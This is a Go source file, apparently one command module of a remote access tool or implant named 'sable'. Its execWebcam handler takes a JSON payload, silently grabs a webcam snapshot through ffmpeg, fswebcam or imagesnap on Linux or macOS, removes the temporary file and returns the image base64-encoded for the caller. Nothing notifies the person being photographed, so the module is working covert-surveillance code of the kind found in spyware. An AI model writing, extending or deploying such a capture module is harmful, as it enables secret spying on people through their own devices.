//go:build linux || darwin

package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"time"
)

func execWebcam(payload json.RawMessage) map[string]any {
	var p struct {
		Device  string `json:"device"`
		Width   int    `json:"width"`
		Height  int    `json:"height"`
		Quality int    `json:"quality"`
	}
	_ = json.Unmarshal(payload, &p)

	if p.Device == "" {
		if runtime.GOOS == "darwin" {
			p.Device = "default"
		} else {
			p.Device = "/dev/video0"
		}
	}
	if p.Width <= 0 {
		p.Width = 1280
	}
	if p.Height <= 0 {
		p.Height = 720
	}
	if p.Quality <= 0 {
		p.Quality = 3
	}

	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("sable-cam-%d.jpg", time.Now().UnixNano()))
	defer os.Remove(tmpFile)

	var err error
	var out []byte

	if runtime.GOOS == "darwin" {
		err = captureWebcamDarwin(tmpFile, p.Device)
	} else {
		out, err = captureWebcamLinux(tmpFile, p.Device, p.Width, p.Height, p.Quality)
	}

	if err != nil {
		msg := err.Error()
		if len(out) > 0 {
			msg = msg + ": " + string(out)
		}
		return map[string]any{"error": msg, "device": p.Device}
	}

	data, err := os.ReadFile(tmpFile)
	if err != nil {
		return map[string]any{"error": fmt.Sprintf("read webcam snapshot: %v", err)}
	}

	return map[string]any{
		"content": encodeBase64(data),
		"format": "jpg",
		"mime": "image/jpeg",
		"filename": "webcam.jpg",
		"size": len(data),
		"device": p.Device,
		"width": p.Width,
		"height": p.Height,
		"captured_at": time.Now().Format(time.RFC3339),
	}
}

func captureWebcamLinux(tmpFile, device string, width, height, quality int) ([]byte, error) {
	size := strconv.Itoa(width) + "x" + strconv.Itoa(height)

	args := []string{
		"-hide_banner", "-loglevel", "error", "-y",
		"-f", "v4l2", "-video_size", size,
		"-i", device,
		"-frames:v", "1", "-q:v", strconv.Itoa(quality),
		tmpFile,
	}
	cmd := exec.Command("ffmpeg", args...)
	out, err := cmd.CombinedOutput()
	if err == nil {
		return out, nil
	}

	cmd = exec.Command("fswebcam",
		"--no-banner", "--resolution", size,
		"--jpeg", "90", "--device", device, tmpFile,
	)
	out2, err2 := cmd.CombinedOutput()
	if err2 == nil {
		return out2, nil
	}
	if len(out2) > 0 {
		return out2, err2
	}
	return out, err
}

func captureWebcamDarwin(tmpFile, device string) error {
	var cmd *exec.Cmd
	if device != "" && device != "default" {
		cmd = exec.Command("imagesnap", "-d", device, tmpFile)
	} else {
		cmd = exec.Command("imagesnap", tmpFile)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("imagesnap failed: %v: %s", err, string(out))
	}
	return nil
}
